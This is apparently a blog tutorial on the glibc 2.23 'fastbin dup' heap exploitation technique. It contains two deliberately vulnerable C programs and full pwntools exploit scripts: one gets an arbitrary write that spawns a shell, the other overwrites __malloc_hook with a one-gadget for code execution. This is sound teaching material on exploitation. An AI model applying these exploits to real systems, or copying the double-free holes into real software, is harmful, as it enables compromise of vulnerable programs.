---
layout: post
title: Fastbin Exploitation
description: Explanation of the `fastbin dup` heap exploitation technique
date: 2025-10-05
categories:
  - Guide
  - heap-exploitation
tags:
  - fastbin-dup
  - fastbin
  - heap-exploitation
---
# Fastbin Exploitation

### Overview

This heap exploitation technique leverages a double free vulnerability to trick the allocator into returning the same chunk twice, without freeing it in between. This technique is used to corrupt a chunk's metadata to link a fake chunk(target address) into a fastbin list.  This can be used to gain arbitrary read/write primitive.
### Fastbin Review

There are 10 fastbins which are maintained using a singly linked list. The linked list uses a Last In First Out (LIFO) manner. Each bin has chunks of the same size and the sizes are : 16, 24, 32, 40, 48, 56, 64, 72, 80 and 88. The sizes include metadata (`prev_size` and `size`). 
Consolidation does NOT happen with free fastbin size chunks.
### Double Free Vulnerability

A double free vulnerability occurs when a chunk of memory that was previously allocated is freed more than once. This is dangerous because it corrupts the allocato's data structures.

#### Mitigation

- `Fasttop` check: If the chunk being freed is at the top of the fastbin list `GLIBC` will throw an error (`double free or corruption (fasttop)`).  

```c
if (__builtin_expect (old == p, 0)) malloc_printerr ("double free or corruption (fasttop)");
```

 This is bypassed by freeing a different chunk in between the one that will be freed twice.

### Exploitation

Exploiting Double Free in fastbins. 

Fastbins are singly-linked lists used by the allocator to manage small, recently freed chunks efficiently. The progression of the fastbin list state during double free attack:
- `a` is freed: `head -> a -> tail`
- `b` is freed: `head -> b -> a -> tail` (used to bypass double free protection).
- `a` is freed again : `head -> a -> b -> a -> tail`. (chunk pointer a is now duplicated)

Because the chunk pointer for a has been duplicated in the free list, the heap allocater will hand out the same memory address multiple times when more chunks of the same size are allocated. 

if subsequent allocations are requested, the allocator will hand out chunks like this:

- `c = malloc(size)` returns chunk `a`
- `d = malloc(size)` returns chunk`b`
- `e = malloc(size)` returns chunk `a` again (same address as `c`)

Since two pointers now point to the same exact location in memory, an attacker can manipulate the content of that memory through one pointer, while the allocator still manages the block via the other pointer.

#### Arbitrary Write/Read

The goal of the fastbin dup technique is to achieve arbitrary read/write primitive, which is often achieved through fastbin corruption.

When a chunk is freed, its forward pointer (`fd`) points to the next free chunk in the list. By controlling a chunk that is in the fastbin list, you can overwrite the `fd` pointer to point to an arbitrary, controlled memory address.

When a new allocation of that size is made, the allocator will return the applied arbitrary 
memory address. 


##### Example

Vulnerable Application Code

This example is done on `glibc 2.23` 

```sh
pwn@90782eb49a00:~/workspace$ /lib/x86_64-linux-gnu/libc.so.6 
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.4.0 20160609.
Available extensions:
	crypt add-on version 2.1 by Michael Glad and others
	GNU Libidn by Simon Josefsson
	Native POSIX Threads Library by Ulrich Drepper et al
	BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.

```

In modern `glibc` you would need to fill in the `tcache` bins first. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct target {
        char username[0x8];
        char target[0x20];
} targets;

char *ptrs[10];
int count = 0;

void allocate() {
        printf("Enter size: ");
        int size;
        scanf("%d", &size);
        ptrs[count] = (char*)malloc(size);
        count++;
}

void deallocate() {
        printf("Enter Index: ");
        int index;
        scanf("%d", &index);
        free(ptrs[index]);
}

void get_data() {
        printf("Enter Index: ");
        int index;
        scanf("%d", &index);
        
        printf("Enter data: ");
        //fgets(ptrs[index], 64, stdin);
        scanf("%s", ptrs[index]);
}

void menu() {
        puts("1. malloc");
        puts("2. free");
        puts("3. scanf");
        puts("4. check");
}

void check() {
        if (strncmp(targets.target, "admin", 5) == 0) {
                puts("you win");
                system("/bin/sh");
        } else {
                puts("you lose");
        }
}

int main() {

        setbuf(stdin, NULL);
        setbuf(stdout, NULL);

        printf("Target = %p\n", targets.target);

        printf("Enter username: ");
        scanf("%s",targets.username);
        int choice;
        while (1) {
                menu();
                printf("> ");
                scanf("%d", &choice);
                switch (choice) {
                        case 1:
                                allocate();
                                break;
                        case 2: 
                                deallocate();
                                break;
                        case 3:
                                get_data();
                                break;
                        case 4:
                                check();
                                break;
                        default:
                                puts("Invalid Choice");
                }       
        }




        return 0;
}
```

> Compile `gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32`

The application has 4 main functions

1. `allocate()`
	- get size from user and allocate a `malloc` a chunk of that size.
2. `deallocate()`
	- `free` a chunk
3. `get_data()`
	- Enter data in a specific chunk
4. `check()`
	- check if `targets.target = 'admin`. If it is it gives you a shell.
###### Exploitation

To achieve the `fastbin dup` we have to overwrite a the forward (`fd`) pointer, of a chunk in the `fastbin` using a double free or use-after-free ( double-free in this case). If we can overwrite `fd` pointer, we can trick the allocator to return a pointer out target location the next time we allocate another chunk.

Lets trigger the double-free vulnerability 

```python
malloc(16) # 0
malloc(16) # 1

free(0)
free(1)
free(0)
```

we had to free another chunk between the double free in order to bypass the `double free or corruption (fasttop)` mitigation.

```c
if (__builtin_expect (old == p, 0)) malloc_printerr ("double free or corruption (fasttop)");
```

Now lets look at the `fastbin`

![Fastbin 1](/assets/images/pwn/fastbin_dup/fastbin.png)

The bin goes like this `0x804b008 -> 0x804b020 ->  0x804b008`. The chunk `0x804b008` is placed twice in the `fastbin`

Now we have to return `0x804b008` and overwrite the `fd` pointer with out target location. then allocate 2 chunks. 

```python
malloc(16) # 2 | 0 
get_data(0,p32(target-8))

malloc(16) # 3 | 1
malloc(16) # 4 | 0 (again)
```

I subtracted `8` from the target address because `malloc` treats chunks as starting 8 bytes before their user data in 32-bit and 16 bytes in  64 bit binaries

Now lets look at the `fastbin`

![Fastbin2](/assets/images/pwn/fastbin_dup/fastbin2.png)

we can see that the chunk in the `fastbin` now points to our target `0x804a0a8` which is the `struct targets` + 8.  The next allocation will be our target location, which provides a arbitrary write.

> Note
> You have to setup metadata for your chunk in order for the technique to work. In this case the username field is used.


```python
malloc(16) # 5 | this is our target location
get_data(5, b'admin\x00')
```

We now wrote `admin` to our target.

Final Exploit

```python
def malloc(size:int):
	log.info("calling malloc ...")
	sla(b"> ", b'1')
	sla(b"Enter size: ", str(size).encode())
	
def free(index:int):
	log.info("calling free ...")
	sla(b"> ", b'2')
	sla(b"Enter Index: ", str(index).encode())
	
def get_data(index:int, data:bytes):
	log.info("calling scanf ...")
	sla(b"> ", b'3')
	sla(b"Enter Index: ", str(index).encode())
	sla(b"Enter data: ", data)
	
def check():
	sla(b"> ", b'4')

def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################

	ru("Target = ")
	target = int(rl(), 16)
	print_leak("Target ", target)


	metadata = flat(
		p32(0x18),
		p32(0x19)
	)

	sla(b"Metadata: ", metadata)


	malloc(16) # 0
	malloc(16) # 1

	free(0)
	free(1)
	free(0)

	malloc(16) # 2 | 0 
	malloc(16) # 3 | 1

	get_data(0,p32(target-8))
	malloc(16) # 4 | 0 (again)
	malloc(16) # 5
	check()
	get_data(5, b'admin\x00')

	check()
```

Results

![Arbitrary Write](/assets/images/pwn/fastbin_dup/write.png)

Was able to perform the arbitrary write.

#### Code Execution

target `__free_hook` of `__malloc_hook` and set up a one-gadget

##### Example

This is just like the previous example except that our target memory location is now the `_-free_hook` or `__malloc_hook` 

Vulnerable code


This example is done on `glibc 2.23` 

```sh
pwn@90782eb49a00:~/workspace$ /lib/x86_64-linux-gnu/libc.so.6 
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.4.0 20160609.
Available extensions:
	crypt add-on version 2.1 by Michael Glad and others
	GNU Libidn by Simon Josefsson
	Native POSIX Threads Library by Ulrich Drepper et al
	BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.

```

In modern `glibc` you would need to fill in the `tcache` bins first. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *ptrs[10];
int count = 0;

void allocate() {
        printf("Enter size: ");
        int size;
        scanf("%d", &size);
        ptrs[count] = (char*)malloc(size);
        count++;
}


void deallocate() {
        printf("Enter Index: ");
        int index;
        scanf("%d", &index);
        free(ptrs[index]);
}


void get_data() {
        printf("Enter Index: ");
        int index;
        scanf("%d", &index);
        
        printf("Enter data: ");
        //fgets(ptrs[index], 64, stdin);
        scanf("%s", ptrs[index]);
}

void menu() {
        puts("1. malloc");
        puts("2. free");
        puts("3. scanf");
}


int main() {

        setbuf(stdin, NULL);
        setbuf(stdout, NULL);

        printf("leak = %p\n", printf);

        int choice;
        while (1) {
                menu();
                printf("> ");
                scanf("%d", &choice);
                switch (choice) {
                        case 1:
                                allocate();
                                break;
                        case 2: 
                                deallocate();
                                break;
                        case 3:
                                get_data();
                                break;
                        default:
                                puts("Invalid Choice");
                }       
        }

        return 0;
}
```

The application has 3 main functions

1. `allocate()`
	- get size from user and allocate a `malloc` a chunk of that size.
2. `deallocate()`
	- `free` a chunk
3. `get_data()`
	- Enter data in a specific chunk

###### Exploitation

Lets trigger the double-free vulnerability 

```python
malloc(92) # 0
malloc(92) # 1

free(0)
free(1)
free(0)
```

Lets view the fast bins

![Arbitrary Write](/assets/images/pwn/fastbin_dup/cfastbin1.png)

The chunk `0x602080` appears twice in the `fastbin`.

The next call to `malloc` of the size `92` will return the `0x602080` chunk which we will use to overwrite the `fd` pointer of the chunk `0x602080` that is still in the `fastbin`. 

But do we overwrite the `fd` with?

Our target here will be the `__malloc_hook`, but we need to remember that our target has to have the correct metadata (size field) to get pass the size check `malloc(): memory corruption (fast)` mitigation.

Lets take a look at `__malloc_hook` 

![Arbitrary Write](/assets/images/pwn/fastbin_dup/malloc_hook.png)

`__malloc_hook` is at `0x7ffff7bc4b10` but we can see that the previous word is a large number which won't pass the size check. So we need to look near `__malloc_hook` where we can place our data

Lets look at `__malloc_hook` - 35

![Arbitrary Write](/assets/images/pwn/fastbin_dup/malloc_hook35.png)

We can see that at the address `0x7ffff7bc4af5` there is `0x7f` which is perfect for use can it will pass the `fastbin` size field check.

So now we have to allocate

```python
malloc(92) # 2 | 0 
target = libc.sym['__malloc_hook'] - 35
get_data(0 ,p64(target))

malloc(92) # 3 | 1
malloc(92) # 4 | 0 (again)
```

The next call to `malloc` we return our target memory location.

First find a one gadget.

![Arbitrary Write](/assets/images/pwn/fastbin_dup/one_gadget.png)

I will use `0xf1247`.

```python
malloc(92)
one_gadget = libc.address + 0xf1247
payload = flat(
	cyclic(0x13), # padding to __malloc_hook  
	one_gadget
)
get_data(5, payload)
```

The next call to `malloc` will pop a shell

```python
malloc(92)
```

Final exploit

```python
def malloc(size:int):
	log.info("calling malloc ...")
	sla(b"> ", b'1')
	sla(b"Enter size: ", str(size).encode())
	
def free(index:int):
	log.info("calling free ...")
	sla(b"> ", b'2')
	sla(b"Enter Index: ", str(index).encode())
	
def get_data(index:int, data:bytes):
	log.info("calling scanf ...")
	sla(b"> ", b'3')
	sla(b"Enter Index: ", str(index).encode())
	sla(b"Enter data: ", data)
	
def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################

	ru("leak = ")
	printf = int(rl(), 16)
	print_leak("printf ", printf)

	libc.address = printf - libc.sym["printf"]
	print_leak("libc base address", libc.address)

	malloc_hook = libc.sym['__malloc_hook']
	print_leak("__malloc_hook", malloc_hook)

	one_gadget = libc.address + 0xf1247
	print_leak("one gadget", one_gadget)
	payload = flat(
		cyclic(0x13), # padding to __malloc_hook
		one_gadget
	)
	#print_leak("payload ", payload)

	size = 0x60
	log.info(f"We will malloc chunks of size: {size}")

	# double free

	malloc(size)
	malloc(size)

	free(0)
	free(1)
	free(0)

	malloc(size) # 2 | same as 0
	#target = (malloc_hook - 35 + 16) - 0x200000
	target = malloc_hook - 35 
	print_leak("target", target)
	get_data(2, p64(target))


	malloc(size) # 3 | same as 1
	malloc(size) # 4 | same as 0
	get_data(4, b"AAAA")
	malloc(size) # 5 enter one

	get_data(5, payload)
	malloc(size)

```

This gets has a shell.

![Arbitrary Write](/assets/images/pwn/fastbin_dup/shell2.png)

The reason why we request chunks of size 92 earlier is because we want the those chunks to belong to the `0x70 fastbin`, which is the same `fastbin` that the our fake chunk near `__malloc_hook` will be placed in if it was freed (`0x7f` in this case). This is done so that chunk can have the correct size.  
## Write Targets
So which targets would we wish to overwrite?
- `__free_hook`
- `__malloc_hook`
- Global Offset Table (GOT)
